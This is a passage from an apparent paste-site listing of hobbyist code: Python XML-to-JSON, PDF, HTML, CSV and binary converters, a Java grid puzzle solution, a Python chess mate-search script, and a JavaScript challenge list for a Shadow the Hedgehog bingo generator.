    xml_filename = 'example.xml'
    json_filename = 'xml2json.json'

    # Convert the XML to a JSON file
    xml_to_json(xml_filename, json_filename)

    print(f""Converted '{xml_filename}' to '{json_filename}'."")

"
DEWk9FVi,xml2pdf,Python253,Python,Saturday 16th of March 2024 01:46:48 PM CDT,"#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Filename: xml2pdf.py
# Version: 1.0.0
# Author: Jeoi Reqi

""""""
Description:
This script converts an XML file (.xml) to a PDF file (.pdf).
It extracts text content from all elements in the XML and generates a PDF with each text element in a separate cell.

Requirements:
- Python 3.x
- FPDF library (install using: pip install fpdf)

Usage:
1. Save this script as 'xml2pdf.py'.
2. Ensure your XML file ('example.xml') is in the same directory as the script.
3. Install the FPDF library using the command: 'pip install fpdf'
4. Run the script.
5. The converted PDF file ('xml2pdf.pdf') will be generated in the same directory.

Note: Adjust the 'xml_filename' and 'pdf_filename' variables in the script as needed.
""""""

from fpdf import FPDF
import xml.etree.ElementTree as ET

def xml_to_pdf(xml_filename, pdf_filename):
    pdf = FPDF()
    pdf.add_page()
    pdf.set_font(""Arial"", size=12)

    tree = ET.parse(xml_filename)
    root = tree.getroot()

    for element in root.iter():
        if element.text:
            pdf.multi_cell(0, 10, element.text)

    pdf.output(pdf_filename)

if __name__ == ""__main__"":
    # Set the filenames for the XML and PDF files
    xml_filename = 'example.xml'
    pdf_filename = 'xml2pdf.pdf'

    # Convert the XML to a PDF file
    xml_to_pdf(xml_filename, pdf_filename)

    print(f""Converted '{xml_filename}' to '{pdf_filename}'."")

"
g9j4640e,xml2html,Python253,Python,Saturday 16th of March 2024 01:46:25 PM CDT,"#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Filename: xml2html.py
# Version: 1.0.0
# Author: Jeoi Reqi

""""""
Description:
This script converts an XML file (.xml) to an HTML file (.html).
It reads the text content of each element in the XML and writes it to the HTML file within <p> tags.

Requirements:
- Python 3.x

Usage:
1. Save this script as 'xml2html.py'.
2. Ensure your XML file ('example.xml') is in the same directory as the script.
3. Run the script.
4. The converted HTML file ('xml2html.html') will be generated in the same directory.

Note: Adjust the 'xml_filename' and 'html_filename' variables in the script as needed.
""""""

import xml.etree.ElementTree as ET

def xml_to_html(xml_filename, html_filename):
    tree = ET.parse(xml_filename)
    root = tree.getroot()

    with open(html_filename, 'w') as htmlfile:
        htmlfile.write('<html><body>')
        for element in root.iter():
            if element.text:
                htmlfile.write('<p>' + element.text + '</p>')
        htmlfile.write('</body></html>')

if __name__ == ""__main__"":
    # Set the filenames for the XML and HTML files
    xml_filename = 'example.xml'
    html_filename = 'xml2html.html'

    # Convert the XML to an HTML file
    xml_to_html(xml_filename, html_filename)

    print(f""Converted '{xml_filename}' to '{html_filename}'."")

"
JHLMJ9yq,xml2csv,Python253,Python,Saturday 16th of March 2024 01:46:03 PM CDT,"#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Filename: xml2csv.py
# Version: 1.0.0
# Author: Jeoi Reqi

""""""
Description:
This script converts an XML file (.xml) to a CSV file (.csv).
It extracts data from specific elements in the XML and writes it to the CSV file.

Requirements:
- Python 3.x

Usage:
1. Save this script as 'xml2csv.py'.
2. Ensure your XML file ('example.xml') is in the same directory as the script.
3. Update the 'your_element_path' and field names in the script based on your XML structure.
4. Run the script.
5. The converted CSV file ('xml2csv.csv') will be generated in the same directory.

Note: Adjust the 'xml_file' and 'csv_file' variables in the script as needed.
""""""

import xml.etree.ElementTree as ET
import csv

def xml_to_csv(xml_file, csv_file):
    tree = ET.parse(xml_file)
    root = tree.getroot()

    with open(csv_file, 'w', newline='') as csvfile:
        csvwriter = csv.writer(csvfile)

        # Update 'your_element_path' and field names based on your XML structure
        for element in root.findall('.//your_element_path'):
            # Extract data and write to CSV
            csvwriter.writerow([element.find('field1').text, element.find('field2').text, ...])

if __name__ == ""__main__"":
    # Set the filenames for the XML and CSV files
    xml_file = 'example.xml'
    csv_file = 'xml2csv.csv'

    # Convert the XML to a CSV file
    xml_to_csv(xml_file, csv_file)

    print(f""Converted '{xml_file}' to '{csv_file}'."")

"
v4YmnCAb,xml2bin,Python253,Python,Saturday 16th of March 2024 01:45:37 PM CDT,"#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Filename: xml2bin.py
# Version: 1.0.0
# Author: Jeoi Reqi

""""""
Description:
This script converts an XML file (.xml) to a binary file (.bin).
It reads the text content of each element in the XML and writes it to the binary file.

Requirements:
- Python 3.x

Usage:
1. Save this script as 'xml2bin.py'.
2. Ensure your XML file ('example.xml') is in the same directory as the script.
3. Run the script.
4. The converted binary file ('xml2bin.bin') will be generated in the same directory.

Note: Adjust the 'xml_filename' and 'bin_filename' variables in the script as needed.
""""""

import xml.etree.ElementTree as ET

def xml_to_bin(xml_filename, bin_filename):
    tree = ET.parse(xml_filename)
    root = tree.getroot()

    with open(bin_filename, 'wb') as binfile:
        for element in root.iter():
            if element.text:
                binfile.write(element.text.encode('utf-8') + b'\n')

if __name__ == ""__main__"":
    # Set the filenames for the XML and binary files
    xml_filename = 'example.xml'
    bin_filename = 'xml2bin.bin'

    # Convert the XML to a binary file
    xml_to_bin(xml_filename, bin_filename)

    print(f""Converted '{xml_filename}' to '{bin_filename}'."")

"
ftSY0Fe4,buckets,nmh07000,Java,Saturday 16th of March 2024 01:39:58 PM CDT,"import java.util.*;
import java.io.*;
public class buckets{
    static class Point {
        int row;
        int col;
    }
    public static void main(String[] args) throws IOException {
        BufferedReader br = new BufferedReader(new FileReader(""buckets.in""));
		PrintWriter pw = new PrintWriter(new FileWriter(""buckets.out""));
        char[][] field = new char[10][10];
        int ans = 0;
        Point B = new Point();
        Point R = new Point();
        Point L = new Point();
        
        for(int i=0; i<10; i++) {
            String s = br.readLine();
            for(int j=0; j<10; j++) {
                field[i][j] = s.charAt(j);
                if (field[i][j] == 'B') {
                    B.row = i;
                    B.col = j;
                }
                else if(field[i][j] == 'R') {
                    R.row = i;
                    R.col = j; 
                }
                else if(field[i][j] == 'L') {
                    L.row = i;
                    L.col = j; 
                }
            }
        }
        
        boolean inTheWay = false;
        int distBR = Math.abs(B.row-R.row) + Math.abs(B.col-R.col);
        int distLR = Math.abs(L.row-R.row) + Math.abs(L.col-R.col);
        int distBL = Math.abs(B.row-L.row) + Math.abs(B.col-L.col);
        
        if(((R.col == L.col && R.col == B.col) || (R.row == L.row && R.row == B.row)) && distBR + distLR == distBL) {
            inTheWay = true;
        }
        
        ans = Math.abs(B.row-L.row) + Math.abs(B.col-L.col) -1;
        if(inTheWay) {ans+=2;}
        pw.println(ans);
		pw.close();
        
    }
}"
smH51XnK,quite good moves_to_mate 14 but is 10 otherwise well,max2201111,Python,Saturday 16th of March 2024 01:21:23 PM CDT,"import chess

def simplify_fen(fen):
    """"""Simplifies a FEN string to include only position, turn, castling availability, and en passant target.""""""
    return ' '.join(fen.split(' ')[:4])

def initialize_game_tree(initial_fen):
    """"""Initializes the game tree with the root node based on the initial FEN.""""""
    simplified_fen = simplify_fen(initial_fen)
    game_tree = {1: {'fen': simplified_fen, 'parent': None, 'color': chess.WHITE if 'w' in initial_fen else chess.BLACK, 'children': [], 'moves_to_mate': None}}
    fen_to_node_id = {simplified_fen: 1}
    return game_tree, fen_to_node_id

def add_descendants_iteratively(game_tree, fen_to_node_id):
    """"""Expands the game tree by iteratively adding legal move descendants of each game state.""""""
    queue = [(1, 0)]
    while queue:
        node_id, _ = queue.pop(0)
        board = chess.Board(game_tree[node_id]['fen'] + "" 0 1"")
        for move in board.legal_moves:
            board.push(move)
            simplified_fen = simplify_fen(board.fen())
            if simplified_fen not in fen_to_node_id:
                new_node_id = len(game_tree) + 1
                game_tree[new_node_id] = {'fen': simplified_fen, 'parent': node_id, 'color': chess.WHITE if board.turn else chess.BLACK, 'children': [], 'moves_to_mate': None}
                fen_to_node_id[simplified_fen] = new_node_id
                game_tree[node_id]['children'].append(new_node_id)
                queue.append((new_node_id, 0))
            board.pop()

def update_game_outcomes(game_tree):
    """"""Updates game outcomes focusing only on checkmates.""""""
    for node_id, node in game_tree.items():
        board = chess.Board(node['fen'] + "" 0 1"")
        if board.is_checkmate():
            node['result'] = 1 if board.turn == chess.BLACK else -1  # Black's turn but checkmate means White wins, and vice versa
            node['moves_to_mate'] = 0  # Checkmate is immediate, no more moves required.
        elif board.is_game_over():
            node['result'] = 0  # For draws or stalemates, we consider the result as 0 (this will be ignored in propagation)


def update_parent_preferences(game_tree):
    def recurse(node_id):
        node = game_tree[node_id]
        if 'result' in node:  # Check if the node has a direct outcome
            return node['result'], [node_id], 0 if 'moves_to_mate' in node else None

        best_result = 0  # Assume draw as the default outcome
        best_path = []
        best_moves_to_mate = None

        for child_id in node['children']:
            child_result, child_path, child_moves_to_mate = recurse(child_id)

            if child_result == 0 or child_moves_to_mate is None:  # Skip draws or paths not leading to checkmate
                continue

            # Ensure we have a valid best_moves_to_mate for comparison
            if best_moves_to_mate is None:
                best_moves_to_mate = child_moves_to_mate
                best_result, best_path = child_result, child_path
            else:
                # Compare only if child_moves_to_mate is not None and update accordingly
                if node['color'] == chess.WHITE and child_result == 1:
                    if child_moves_to_mate < best_moves_to_mate:
                        best_result, best_path, best_moves_to_mate = child_result, child_path, child_moves_to_mate
                elif node['color'] == chess.BLACK and child_result == -1:
                    if child_moves_to_mate > best_moves_to_mate:
                        best_result, best_path, best_moves_to_mate = child_result, child_path, child_moves_to_mate

        if best_moves_to_mate is not None:
            node['result'] = best_result
            node['moves_to_mate'] = 1 + best_moves_to_mate
        else:
            node['result'] = best_result  # could still be 0 if no child paths lead to a win
            node['moves_to_mate'] = None

        return node['result'], [node_id] + best_path, node.get('moves_to_mate')

    result, path, moves_to_mate = recurse(1)  # Start the recursion from the root node.
    return path


# Make sure to replace or integrate this function into your main execution logic and re-run your analysis.



def print_path(game_tree, path):
    """"""Prints the board positions along the path.""""""
    for node_id in path:
        node = game_tree[node_id]
        board = chess.Board(node['fen'] + "" 0 1"")
        moves_to_mate = ""N/A"" if node.get('moves_to_mate') is None else node.get('moves_to_mate')
        print(f""Node ID: {node_id}, Result: {node.get('result', 'N/A')}, Moves to Mate: {moves_to_mate}"")
        print(board,node,""<<\n"")
        print(""---"")

def main():
    initial_fen = ""8/8/8/3k4/8/8/2K2Q2/8 w - - 0 1""  # Example FEN
    initial_fen = ""8/8/8/3k4/8/2K5/5q2/8 w - - 0 1""

    game_tree, fen_to_node_id = initialize_game_tree(initial_fen)
    add_descendants_iteratively(game_tree, fen_to_node_id)
    update_game_outcomes(game_tree)
    path = update_parent_preferences(game_tree)
    print(game_tree[1])
    print(""Path to the outcome:"")
    print_path(game_tree, path)

if __name__ == ""__main__"":
    main()"
H8BxyyE9,[JS] Shadow 2v2,CFood,JavaScript,Saturday 16th of March 2024 01:20:01 PM CDT,"bingoGenerator = require(""./generators/generator_bases/isaac_generator.js"");

var bingoList = [];

var easyChallenges = [
  { name: ""Westopolis 5 Keys"", types: [""westopolis"", ""keys""] },
  { name: ""Digital Circuit 5 Keys"", types: [""digitalcircuit"", ""keys""] },
  { name: ""Glyphic Canyon 5 Keys"", types: [""glyphiccanyon"", ""keys""] },
  { name: ""Lethal Highway 5 Keys"", types: [""lethalhighway"", ""keys""] },
  { name: ""Cryptic Castle 5 Keys"", types: [""crypticcastle"", ""keys""] },
  { name: ""Prison Island 5 Keys"", types: [""prisonisland"", ""keys""] },
  { name: ""Circus Park 5 Keys"", types: [""circuspark"", ""keys""] },
  { name: ""Westopolis DNH"", types: [""westopolis"", ""dnh""] },
  { name: ""Digital Circuit DH"", types: [""digitalcircuit"", ""dnh""] },
  { name: ""Glyphic Canyon DNH"", types: [""glyphiccanyon"", ""dnh""] },
  { name: ""Lethal Highway DH"", types: [""lethalhighway"", ""dnh""] },
  { name: ""Cryptic Castle DNH"", types: [""crypticcastle"", ""dnh""] },
  { name: ""Prison Island DNH"", types: [""prisonisland"", ""dnh""] },
  { name: ""Circus Park DNH"", types: [""circuspark"", ""dnh""] },
  { name: ""Westopolis 1 Shadow Box & finish"", types: [""westopolis"", ""box""] },
  { name: ""Digital Circuit 2 Shadow Boxes & finish"", types: [""digitalcircuit"", ""box""] },
  { name: ""Glyphic Canyon 4 Shadow Boxes & finish"", types: [""glyphiccanyon"", ""box""] },
  { name: ""Lethal Highway 5 Shadow Boxes & finish"", types: [""lethalhighway"", ""box""] },
  { name: ""Cryptic Castle 3 Shadow Boxes & finish"", types: [""crypticcastle"", ""box""] },
  { name: ""Prison Island 3 Shadow Boxes & finish"", types: [""prisonisland"", ""box""] },
  { name: ""Circus Park 2 Shadow Boxes & finish"", types: [""circuspark"", ""box""] },
  { name: ""Westopolis Neutral w/o Chaos Control"", types: [""westopolis"", ""restricted""] },
  { name: ""Westopolis Hero w/o Chaos Control"", types: [""westopolis"", ""restricted""] },
  { name: ""Glyphic Canyon Dark w/o Chaos Control"", types: [""glyphiccanyon"", ""restricted""] },
  { name: ""Glyphic Canyon Neutral w/o Chaos Control"", types: [""glyphiccanyon"", ""restricted""] },
  { name: ""Glyphic Canyon Hero w/o Chaos Control"", types: [""glyphiccanyon"", ""restricted""] },
  { name: ""Lethal Highway Dark w/o Chaos Control"", types: [""lethalhighway"", ""restricted""] },
  { name: ""Prison Island Dark w/o Chaos Control"", types: [""prisonisland"", ""restricted""] },
  { name: ""Prison Island Neutral w/o Chaos Control"", types: [""prisonisland"", ""restricted""] },
  { name: ""Prison Island Hero w/o Chaos Control"", types: [""prisonisland"", ""restricted""] },
  { name: ""Circus Park Dark w/o Chaos Control"", types: [""circuspark"", ""restricted""] },
  { name: ""Circus Park Neutral w/o Chaos Control"", types: [""circuspark"", ""restricted""] },
  { name: ""Circus Park Hero w/o Chaos Control"", types: [""circuspark"", ""restricted""] },
  { name: ""Westopolis Dark via all 6 checkpoints"", types: [""westopolis"", ""checkpoints""] },
  { name: ""Westopolis Neutral via all 6 checkpoints"", types: [""westopolis"", ""checkpoints""] },
  { name: ""Westopolis Hero via all 6 checkpoints"", types: [""westopolis"", ""checkpoints""] },
  { name: ""Digital Circuit Dark via all 7 checkpoints"", types: [""digitalcircuit"", ""checkpoints""] },
  { name: ""Digital Circuit Hero via all 7 checkpoints"", types: [""digitalcircuit"", ""checkpoints""] },
  { name: ""Glyphic Canyon Dark via all 8 checkpoints"", types: [""glyphiccanyon"", ""checkpoints""] },
  { name: ""Glyphic Canyon Neutral via all 8 checkpoints"", types: [""glyphiccanyon"", ""checkpoints""] },
  { name: ""Glyphic Canyon Hero via all 8 checkpoints"", types: [""glyphiccanyon"", ""checkpoints""] },
  { name: ""Lethal Highway Dark via all 5 checkpoints"", types: [""lethalhighway"", ""checkpoints""] },
  { name: ""Lethal Highway Hero via all 5 checkpoints"", types: [""lethalhighway"", ""checkpoints""] },
  { name: ""Cryptic Castle Dark via all 8 checkpoints"", types: [""crypticcastle"", ""checkpoints""] },
  { name: ""Cryptic Castle Neutral via all 8 checkpoints"", types: [""crypticcastle"", ""checkpoints""] },
  { name: ""Cryptic Castle Hero via all 8 checkpoints"", types: [""crypticcastle"", ""checkpoints""] },
  { name: ""Prison Island Dark via all 7 checkpoints"", types: [""prisonisland"", ""checkpoints""] },
  { name: ""Prison Island Neutral via all 7 checkpoints"", types: [""prisonisland"", ""checkpoints""] },
  { name: ""Prison Island Hero via all 7 checkpoints"", types: [""prisonisland"", ""checkpoints""] },
  { name: ""Circus Park Dark via all 7 checkpoints"", types: [""circuspark"", ""checkpoints""] },
  { name: ""Circus Park Neutral via all 7 checkpoints"", types: [""circuspark"", ""checkpoints""] },
  { name: ""Circus Park Hero via all 7 checkpoints"", types: [""circuspark"", ""checkpoints""] },
  { name: ""Defeat Black Bull w/o Chaos Control"", types: [""blackbull"", ""restricted""] },
  { name: ""Defeat Black Bull without Guns"", types: [""blackbull"", ""restricted""] },
  { name: ""Defeat Egg Breaker without Guns"", types: [""eggbreaker"", ""restricted""] },
  { name: ""10 Keys"", types: [""keys""] },
  { name: ""25 Keys"", types: [""keys""] },
  { name: ""10 A Ranks"", types: [""abc""] },
  { name: ""25 A Ranks"", types: [""abc""] },
  { name: ""Die to a Gold Beetle"", types: [""goldbeetle""] },
  { name: ""Collect 88 Rings in 2P Game Level 3"", types: [""2pgame"", ""box""] },
  { name: ""Collect 64 Rings in 2P Game Level 1"", types: [""2pgame"", ""box""] },
  { name: ""Collect 50 Rings in 2P Game Level 2"", types: [""2pgame"", ""box""] },
  { name: ""Ride the Armored Vehicle to the 5th Checkpoint (Westopolis)"", types: [""westopolis"", ""box""] },
  { name: ""Finish Westopolis Hero or Dark with 100+ Road Signs"", types: [""westopolis"", ""box""] },
  { name: ""Flip Over 2 Trucks (Westopolis)"", types: [""westopolis"", ""box""] },
  { name: ""Defeat 44 Black Arms OR 34 GUN Soldiers then Westopolis Neutral"", types: [""westopolis"", ""restricted""] },
  { name: ""Hit 4 Capsules (Westopolis)"", types: [""westopolis"", ""box""] },
  { name: ""Hit 2 Life Capsules in Westopolis"", types: [""westopolis"", ""box""] },
  { name: ""Hit a Life Capsule in Digital Circuit"", types: [""digitalcircuit"", ""box""] },
  { name: ""Glyphic Canyon Hero with a higher Dark Score"", types: [""glyphiccanyon"", ""restricted""] },
  { name: ""Glyphic Canyon Dark Pacifist"", types: [""glyphiccanyon"", ""restricted""] },
  { name: ""Lethal Highway Dark Pacifist"", types: [""lethalhighway"", ""restricted""] },
  { name: ""Lethal Highway Hero with NO Capsules"", types: [""lethalhighway"", ""restricted""] },
  { name: ""Lethal Highway Dark with NO Capsules"", types: [""lethalhighway"", ""restricted""] },
  { name: ""Save Cheese then Cream (Cryptic Castle)"", types: [""crypticcastle"", ""restricted""] },
  { name: ""Prison Island Hero Pacifist"", types: [""prisonisland"", ""restricted""] },
  { name: ""39 GUN Soldiers in Prison Island Hero"", types: [""prisonisland"", ""restricted""] },
  { name: ""Hit a Flame Shield Capsule in Prison Island"", types: [""prisonisland"", ""box""] },
  { name: ""Circus Park Neutral with 399 rings"", types: [""circuspark"", ""restricted""] },
  { name: ""10 Keys OR 5 A Ranks"", types: [""or""] },
  { name: ""5 Keys in Westopolis OR 2 Keys in Stage 3"", types: [""or""] },
  { name: ""Finish a stage with 500+ ammo"", types: [""box""] },
  { name: ""Finish a stage with 100+ special weapon ammo"", types: [""box""] },
  { name: ""Finish a stage with 50+ special weapon ammo"", types: [""box""] },
  { name: ""Have a 20+ Life Counter"", types: [""box""] },
  { name: ""Waste both meters in one stage (stand still, don't shoot)"", types: [""restricted""] },
  { name: ""Defeat a Black Oak w/ only an Egg Bazooka"", types: [""restricted""] },
  { name: ""Defeat a Big Foot w/ only homing attacks"", types: [""restricted""] },
  { name: ""Defeat a Sand Worm w/ only a Melee Weapon"", types: [""restricted""] },
  { name: ""Heal a Gold Beetle"", types: [""goldbeetle""] },
  { name: ""Defeat a Shadow Android w/ only spindashes"", types: [""restricted""] },
  { name: ""Defeat 10 enemies w/ a Chaos Control"", types: [""restricted""] },
  { name: ""360 No Scope a GUN Soldier"", types: [""restricted""] }
];

bingoList[1] = easyChallenges;


var mediumChallenges = [
  { name: ""Central City 5 Keys"", types: [""centralcity"", ""keys""] },
  { name: ""The Doom 5 Keys"", types: [""thedoom"", ""keys""] },
  { name: ""Sky Troops 5 Keys"", types: [""skytroops"", ""keys""] },
  { name: ""Mad Matrix 5 Keys"", types: [""madmatrix"", ""keys""] },
  { name: ""Death Ruins 5 Keys"", types: [""deathruins"", ""keys""] },
  { name: ""The ARK 5 Keys"", types: [""theark"", ""keys""] },
  { name: ""Air Fleet 5 Keys"", types: [""airfleet"", ""keys""] },
  { name: ""Iron Jungle 5 Keys"", types: [""ironjungle"", ""keys""] },
  { name: ""Space Gadget 5 Keys"", types: [""spacegadget"", ""keys""] },
  { name: ""Lost Impact 5 Keys"", types: [""lostimpact"", ""keys""] },
  { name: ""Central City DH"", types: [""centralcity"", ""dnh""] },
  { name: ""The Doom DNH"", types: [""thedoom"", ""dnh""] },
  { name: ""Sky Troops DNH"", types: [""skytroops"", ""dnh""] },
  { name: ""Mad Matrix DNH"", types: [""madmatrix"", ""dnh""] },
  { name: ""Death Ruins DH"", types: [""deathruins"", ""dnh""] },
  { name: ""The ARK DN"", types: [""theark"", ""dnh""] },
  { name: ""Air Fleet DNH"", types: [""airfleet"", ""dnh""] },
  { name: ""Iron Jungle DNH"", types: [""ironjungle"", ""dnh""] },
  { name: ""Space Gadget DNH"", types: [""spacegadget"", ""dnh""] },
  { name: ""Lost Impact NH"", types: [""lostimpact"", ""dnh""] },
  { name: ""Central City 2 Shadow Boxes & finish"", types: [""centralcity"", ""box""] },
  { name: ""The Doom 3 Shadow Boxes & finish"", types: [""thedoom"", ""box""] },
  { name: ""Sky Troops 4 Shadow Boxes & finish"", types: [""skytroops"", ""box""] },
  { name: ""Mad Matrix 3 Shadow Boxes & finish"", types: [""madmatrix"", ""box""] },
  { name: ""Death Ruins 2 Shadow Boxes & finish"", types: [""deathruins"", ""box""] },
  { name: ""The ARK 2 Shadow Boxes & finish"", types: [""theark"", ""box""] },
  { name: ""Air Fleet 6 Shadow Boxes & finish"", types: [""airfleet"", ""box""] },
  { name: ""Iron Jungle 3 Shadow Boxes & finish"", types: [""ironjungle"", ""box""] },
  { name: ""Space Gadget 1 Shadow Box & finish"", types: [""spacegadget"", ""box""] },
  { name: ""Lost Impact 1 Shadow Box & finish"", types: [""lostimpact"", ""box""] },
  { name: ""The Doom Neutral w/o Chaos Control"", types: [""thedoom"", ""restricted""] },
  { name: ""The Doom Hero w/o Chaos Control"", types: [""thedoom"", ""restricted""] },
  { name: ""Sky Troops Dark w/o Chaos Control"", types: [""skytroops"", ""restricted""] },
  { name: ""Sky Troops Neutral w/o Chaos Control"", types: [""skytroops"", ""restricted""] },
  { name: ""Sky Troops Hero w/o Chaos Control"", types: [""skytroops"", ""restricted""] },
  { name: ""Mad Matrix Hero w/o Chaos Control"", types: [""madmatrix"", ""restricted""] },
  { name: ""Death Ruins Dark w/o Chaos Control"", types: [""deathruins"", ""restricted""] },
  { name: ""Air Fleet Neutral w/o Chaos Control"", types: [""airfleet"", ""restricted""] },
  { name: ""Air Fleet Hero w/o Chaos Control"", types: [""airfleet"", ""restricted""] },
  { name: ""Iron Jungle Dark w/o Chaos Control"", types: [""ironjungle"", ""restricted""] },
  { name: ""Iron Jungle Neutral w/o Chaos Control"", types: [""ironjungle"", ""restricted""] },
  { name: ""Space Gadget Dark w/o Chaos Control"", types: [""spacegadget"", ""restricted""] },
  { name: ""Space Gadget Neutral w/o Chaos Control"", types: [""spacegadget"", ""restricted""] },
  { name: ""Space Gadget Hero w/o Chaos Control"", types: [""spacegadget"", ""restricted""] },
  { name: ""Lost Impact Neutral w/o Chaos Control"", types: [""lostimpact"", ""restricted""] },
  { name: ""Lost Impact Hero w/o Chaos Control"", types: [""lostimpact"", ""restricted""] },
  { name: ""Central City Dark via all 6 checkpoints"", types: [""centralcity"", ""checkpoints""] },
  { name: ""Central City Hero via all 6 checkpoints"", types: [""centralcity"", ""checkpoints""] },
  { name: ""The Doom Dark via all 6 checkpoints"", types: [""thedoom"", ""checkpoints""] },
  { name: ""The Doom Neutral via all 6 checkpoints"", types: [""thedoom"", ""checkpoints""] },
  { name: ""The Doom Hero via all 6 checkpoints"", types: [""thedoom"", ""checkpoints""] },
  { name: ""Sky Troops Dark via all 8 checkpoints"", types: [""skytroops"", ""checkpoints""] },
  { name: ""Sky Troops Neutral via all 8 checkpoints"", types: [""skytroops"", ""checkpoints""] },
  { name: ""Sky Troops Hero via all 8 checkpoints"", types: [""skytroops"", ""checkpoints""] },
  { name: ""Mad Matrix Dark via all 6 checkpoints"", types: [""madmatrix"", ""checkpoints""] },
  { name: ""Mad Matrix Neutral via all 6 checkpoints"", types: [""madmatrix"", ""checkpoints""] },
  { name: ""Mad Matrix Hero via all 6 checkpoints"", types: [""madmatrix"", ""checkpoints""] },
  { name: ""Death Ruins Dark via all 7 checkpoints"", types: [""deathruins"", ""checkpoints""] },
  { name: ""Death Ruins Hero via all 7 checkpoints"", types: [""deathruins"", ""checkpoints""] },
  { name: ""The ARK Dark via all 8 checkpoints"", types: [""theark"", ""checkpoints""] },
  { name: ""The ARK Neutral via all 8 checkpoints"", types: [""theark"", ""checkpoints""] },
  { name: ""Air Fleet Dark via first 7 checkpoints"", types: [""airfleet"", ""checkpoints""] },
  { name: ""Air Fleet Neutral via all 8 checkpoints"", types: [""airfleet"", ""checkpoints""] },
  { name: ""Air Fleet Hero via all 8 checkpoints"", types: [""airfleet"", ""checkpoints""] },
  { name: ""Iron Jungle Dark via all 8 checkpoints"", types: [""ironjungle"", ""checkpoints""] },
  { name: ""Iron Jungle Neutral via all 8 checkpoints"", types: [""ironjungle"", ""checkpoints""] },
  { name: ""Iron Jungle Hero via first 7 checkpoints"", types: [""ironjungle"", ""checkpoints""] },
  { name: ""Space Gadget Dark via all 8 checkpoints"", types: [""spacegadget"", ""checkpoints""] },
  { name: ""Space Gadget Neutral via all 8 checkpoints"", types: [""spacegadget"", ""checkpoints""] },
  { name: ""Disable 5 Defense Shields in Space Gadget Hero"", types: [""spacegadget"", ""restricted""] },
  { name: ""Lost Impact Neutral via all 8 checkpoints"", types: [""lostimpact"", ""checkpoints""] },
  { name: ""Lost Impact Hero via all 8 checkpoints"", types: [""lostimpact"", ""checkpoints""] },
  { name: ""Air Fleet Dark Deathless"", types: [""airfleet"", ""restricted""] },
  { name: ""Iron Jungle Hero Deathless"", types: [""ironjungle"", ""restricted""] },
  { name: ""Defeat Both Black Bulls"", types: [""and""] },
  { name: ""Defeat Both Heavy Dog & Blue Falcon"", types: [""and""] },
  { name: ""3 Gold Beetles"", types: [""goldbeetle""] },
  { name: ""5 Gold Beetles"", types: [""goldbeetle""] },
  { name: ""7 Gold Beetles"", types: [""goldbeetle""] },
  { name: ""Defeat Heavy Dog without Guns"", types: [""heavydog"", ""restricted""] },
  { name: ""Defeat Blue Falcon without Guns"", types: [""bluefalcon"", ""restricted""] },
  { name: ""Unlock Westopolis & Central City"", types: [""and""] },
  { name: ""Unlock Digital Circuit & Mad Matrix"", types: [""and""] },
  { name: ""Unlock Glyphic Canyon & Sky Troops"", types: [""and""] },
  { name: ""Unlock Prison Island & Iron Jungle"", types: [""and""] },
  { name: ""Unlock Lethal Highway & Air Fleet"", types: [""and""] },
  { name: ""Unlock Cryptic Castle & Circus Park"", types: [""and""] },
  { name: ""Central City Dark with 19 small bombs removed"", types: [""centralcity"", ""restricted""] },
  { name: ""Find a Chaos Control Orb in Central City"", types: [""centralcity"", ""box""] },
  { name: ""Hit 11 Capsules (The Doom)"", types: [""thedoom"", ""box""] },
  { name: ""Hit 3 Life Capsules (The Doom)"", types: [""thedoom"", ""box""] },
  { name: ""Use 6 Dash Rings (The Doom)"", types: [""thedoom"", ""keys""] },
  { name: ""Activate Yellow & Green Tower in Mad Matrix Neutral"", types: [""madmatrix"", ""restricted""] },
  { name: ""Hit 4 Life Capsules (Death Ruins)"", types: [""deathruins"", ""box""] },
  { name: ""Finish The ARK w/ 100+ Rings"", types: [""theark"", ""box""] },
  { name: ""Fail Air Fleet Dark then do Hero"", types: [""airfleet"", ""restricted""] },
  { name: ""Defeat 34 Black Arms in Air Fleet Dark"", types: [""airfleet"", ""restricted""] },
  { name: ""Finish Iron Jungle w/ 100+ Tripod Ammo"", types: [""ironjungle"", ""box""] },
  { name: ""Hit 1 Life Capsule (Space Gadget)"", types: [""spacegadget"", ""box""] },
  { name: ""Finish Space Gadget w/ 200+ Rings"", types: [""spacegadget"", ""box""] },
  { name: ""Finish Lost Impact w/ 300+ Rings"", types: [""lostimpact"", ""box""] },
  { name: ""Hit 2 Life Capsules (Lost Impact)"", types: [""lostimpact"", ""box""] }
];

bingoList[2] = mediumChallenges;


var hardChallenges = [
  { name: ""GUN Fortress 5 Keys"", types: [""gunfortress"", ""keys""] },
  { name: ""Black Comet 5 Keys"", types: [""blackcomet"", ""keys""] },
  { name: ""Lava Shelter 5 Keys"", types: [""lavashelter"", ""keys""] },
  { name: ""Cosmic Fall 5 Keys"", types: [""cosmicfall"", ""keys""] },
  { name: ""Final Haunt 5 Keys"", types: [""finalhaunt"", ""keys""] },
  { name: ""GUN Fortress DH"", types: [""gunfortress"", ""dnh""] },
  { name: ""Black Comet DH"", types: [""blackcomet"", ""dnh""] },
  { name: ""Lava Shelter DH"", types: [""lavashelter"", ""dnh""] },
  { name: ""Cosmic Fall DH"", types: [""cosmicfall"", ""dnh""] },
  { name: ""Final Haunt DH"", types: [""finalhaunt"", ""dnh""] },
  { name: ""GUN Fortress 2 Shadow Boxes & finish"", types: [""gunfortress"", ""box""] },
  { name: ""Black Comet 5 Shadow Boxes & finish"", types: [""blackcomet"", ""box""] },
  { name: ""Lava Shelter 3 Shadow Boxes & finish"", types: [""lavashelter"", ""box""] },
  { name: ""Cosmic Fall 2 Shadow Boxes & finish"", types: [""cosmicfall"", ""box""] },
  { name: ""Final Haunt 3 Shadow Boxes & finish"", types: [""finalhaunt"", ""box""] },
  { name: ""GUN Fortress Hero w/o Chaos Control"", types: [""gunfortress"", ""restricted""] },
  { name: ""Black Comet Hero w/o Chaos Control"", types: [""blackcomet"", ""restricted""] },
  { name: ""Lava Shelter Dark w/o Chaos Control"", types: [""lavashelter"", ""restricted""] },
  { name: ""Lava Shelter Hero w/o Chaos Control"", types: [""lavashelter"", ""restricted""] },
  { name: ""Cosmic Fall Dark w/o Chaos Control"", types: [""cosmicfall"", ""restricted""] },
  { name: ""Cosmic Fall Hero w/o Chaos Control"", types: [""cosmicfall"", ""restricted""] },
  { name: ""Final Haunt Dark w/o Chaos Control"", types: [""finalhaunt"", ""restricted""] },
